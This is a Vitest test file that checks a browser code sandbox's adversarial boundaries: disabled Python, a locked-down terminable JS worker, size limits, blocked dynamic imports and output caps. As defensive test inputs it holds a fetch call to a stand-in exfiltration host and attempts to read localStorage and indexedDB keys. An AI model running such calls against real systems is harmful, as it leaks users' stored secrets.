import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  isRunnableLang,
  MAX_SANDBOX_CODE_BYTES,
  MAX_SANDBOX_OUTPUT_BYTES,
  runInSandbox,
  SANDBOX_TIMEOUT_MS,
} from '../src/canvas/blocks/code/sandbox';

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
  FakeWorker.instances.length = 0;
});

class FakeWorker {
  static instances: FakeWorker[] = [];
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: (() => void) | null = null;
  terminated = false;

  constructor(
    public readonly url: string,
    public readonly options?: WorkerOptions,
  ) {
    FakeWorker.instances.push(this);
  }

  terminate() {
    this.terminated = true;
  }

  emit(data: unknown) {
    this.onmessage?.(new MessageEvent('message', { data }));
  }
}

beforeEach(() => {
  vi.stubGlobal('Worker', FakeWorker);
  vi.stubGlobal('URL', {
    ...URL,
    createObjectURL: vi.fn(() => 'blob:test-worker'),
    revokeObjectURL: vi.fn(),
  });
});

const sandboxSource = readFileSync(
  join(process.cwd(), 'src/canvas/blocks/code/sandbox.ts'),
  'utf8',
);

describe('code sandbox adversarial boundaries', () => {
  it('does not expose Python execution in production', async () => {
    expect(isRunnableLang('python')).toBe(false);
    expect(isRunnableLang('py')).toBe(false);
    const result = await runInSandbox(
      'from js import window\nprint(window.localStorage)',
      'python',
    );

    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/disabled.*isolated/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('places JS in a terminable worker with network and persistence APIs locked', async () => {
    vi.useFakeTimers();
    const pending = runInSandbox(
      `fetch('https://exfil.example/steal'); indexedDB.open('keys')`,
      'js',
    );
    const worker = FakeWorker.instances[0];
    expect(worker).toBeTruthy();
    expect(worker.url).toBe('blob:test-worker');
    expect(worker.options).toEqual({ name: 'mavea-code-sandbox' });
    expect(sandboxSource).toContain("locked('fetch'");
    expect(sandboxSource).toContain("locked('indexedDB',undefined)");
    expect(sandboxSource).toContain("locked('Worker',undefined)");
    expect(sandboxSource).toContain("locked('BroadcastChannel',undefined)");
    expect(sandboxSource).toContain("locked('postMessage'");
    expect(sandboxSource).toContain("new Worker(workerUrl, { name: 'mavea-code-sandbox' })");
    expect(sandboxSource).not.toContain('runPythonAsync');
    expect(sandboxSource).not.toContain('(0,eval)');

    await vi.advanceTimersByTimeAsync(SANDBOX_TIMEOUT_MS);
    expect(await pending).toMatchObject({ ok: false, elapsed: SANDBOX_TIMEOUT_MS });
    expect(worker.terminated).toBe(true);
    expect(URL.revokeObjectURL).toHaveBeenCalledWith('blob:test-worker');
  });

  it('rejects oversized code before allocating an execution host', async () => {
    const code = 'x'.repeat(MAX_SANDBOX_CODE_BYTES + 1);
    const result = await runInSandbox(code, 'js');

    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/too large/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('rejects dynamic imports before allocating a worker', async () => {
    const result = await runInSandbox(`import('/api/llm')`, 'js');
    expect(result).toMatchObject({ ok: false, elapsed: 0 });
    if (!result.ok) expect(result.error).toMatch(/dynamic imports are disabled/i);
    expect(FakeWorker.instances).toHaveLength(0);
  });

  it('re-caps worker output at the parent boundary', async () => {
    const pending = runInSandbox('console.log("x")', 'js');
    const worker = FakeWorker.instances[0];
    worker.emit({ ok: true, output: '🙂'.repeat(MAX_SANDBOX_OUTPUT_BYTES) });

    const result = await pending;
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(new TextEncoder().encode(result.output).byteLength).toBeLessThanOrEqual(
        MAX_SANDBOX_OUTPUT_BYTES,
      );
    }
    expect(worker.terminated).toBe(true);
  });
});
